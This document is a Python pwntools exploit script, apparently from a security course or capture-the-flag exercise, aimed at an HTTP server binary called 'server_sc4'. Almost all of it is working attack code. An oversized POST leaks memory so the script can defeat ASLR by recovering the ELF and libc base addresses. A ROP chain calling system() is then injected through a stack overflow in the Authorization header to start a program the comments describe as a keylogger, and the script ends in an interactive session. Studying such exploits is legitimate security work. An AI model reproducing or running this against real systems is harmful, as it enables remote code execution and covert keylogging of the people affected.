import pwn
import sys

if len(sys.argv) != 3:
    print("Usage: python script.py <target ip> <target port>")
    sys.exit(1)
    
TARGET = sys.argv[1]
TARGET_PORT = sys.argv[2]

# setup binary and libc
libc = pwn.ELF("./libc.so.6")
elf = pwn.context.binary = pwn.ELF("server_sc4")
pwn.context.encoding = 'latin1'

formaat = b"== Request from " + b"A" * 15 + b" at fd " + b"A" * 10 + b"\n"
log_buffer_rbp_offset = 0x450
post_size = 666666
leak_file = "data.txt"

#### Ret2lib offsets ####

# handle: 0x3720
handle_offset_after = "72000" # na deze offset komt handle
# clone: 0xfba30
clone_offset_after = "a6f00"  # na deze offset komt clone

def make_get_request(file):
  return f"GET /{file} HTTP/1.1\r\nHost: {TARGET}:{TARGET_PORT}\r\nUser-Agent: curl/8.4.0\r\nAccept: */*\r\nContent-Type: text/plain\r\nContent-Length: 0\r\n\r\n".encode()

def make_evil_get_request(file):
  return f"GET /{file} HTTP/1.1\r\nHost: {TARGET}:{TARGET_PORT}\r\nUser-Agent: curl/8.4.0\r\nAccept: */*\r\nContent-Type: text/plain\r\nContent-Length: 1337\r\nAuthorization: Basic%s\r\n\r\n".encode()

def make_post_request(file, content_length, data):
  return f"POST /{file} HTTP/1.1\r\nHost: {TARGET}:{TARGET_PORT}\r\nUser-Agent: curl/8.4.0\r\nAccept: */*\r\nContent-Type: text/plain\r\nContent-Length: {content_length}\r\n\r\n{data}".encode()

def make_new_connection(io=None):
  if io is not None:
    io.close()
  return pwn.remote(TARGET, TARGET_PORT)


if __name__.__eq__("__main__"):
  io = make_new_connection()

  # Send POST met post_size als content length
  post_request = make_post_request(leak_file, post_size, "")
  io.send(post_request)
  io.recvall(timeout=5)

  # Send GET for leaked data
  io = make_new_connection()
  get_request = make_get_request(leak_file)
  io.send(get_request)
  # Skip garbage
  io.recvuntil(b"\r\n\r\n")
  io.recvuntil(b"hurt you")
  # Fix for varying ip lengths
  if len(TARGET) > 9:
    io.recv(len(TARGET) - 9)

  leak = io.recvall(timeout=5)
  # Parse inhoud data.txt per 8 bytes
  handle_aslr = None
  for b in range(len(leak) // 8):
    adres = leak[b * 8: b * 8 + 8]
    try:
      print("adres: " + adres.decode())
    except UnicodeDecodeError:
      print("adres: " + hex(pwn.u64(adres)))
      # Om base adres van ELF te vinden
      if handle_offset_after in hex(pwn.u64(adres)):
        if handle_aslr is None:
          handle_aslr = pwn.u64(bytes.fromhex(hex(pwn.u64(adres))[:-2][2:])[::-1] + b"\x00\x00")
      # Om het base adres van libc te vinden
      if clone_offset_after in hex(pwn.u64(adres)):
        clone_aslr = adres
        break

  # Fix base adres van ELF. Dit update alle symbols.
  elf.address = handle_aslr - elf.sym.handle
  print(f"Leaked binary base adres: {hex(elf.address)}")

  # Fix base adres van libc. Dit update alle symbols.
  print(hex(libc.sym.clone + 63))
  libc_offset_adres = libc.sym.clone + 63
  libc.address = (pwn.u64(clone_aslr[1:] + b"\x00")) - libc_offset_adres
  print(f"libc.so.s6 base adres: {hex(libc.address)}")


  #### ROP CHAIN ####
  io = make_new_connection(io)
  rop = pwn.ROP(libc)

  binsh = next(libc.search(b"/bin/sh"))
  keylogger_adres = next(elf.search(b"./server_data\x00"))
  print(f"/bin/sh adres: {hex(binsh)}")
  print(f"Keylogger adres: {hex(keylogger_adres)}")

  # payload om de keylogger server_data te starten
  payload = [
    pwn.p64(rop.find_gadget(["pop rdi", "ret"])[0]), pwn.p64(keylogger_adres),  # pop next val op stack in rdi (which is "./server_data")
    pwn.p64(libc.sym.system)                                                    # system("./server_data")
  ]

  ### PERFORM ATTACK ###
  sc4_exploit = make_evil_get_request(leak_file)
  padding_size = ((log_buffer_rbp_offset + 8) - len(formaat)) - (len(sc4_exploit) - 6)
  sc4_exploit = sc4_exploit.replace(b"%s", b"A" * padding_size + b"".join(payload))

  io.send(sc4_exploit)
  io.interactive()

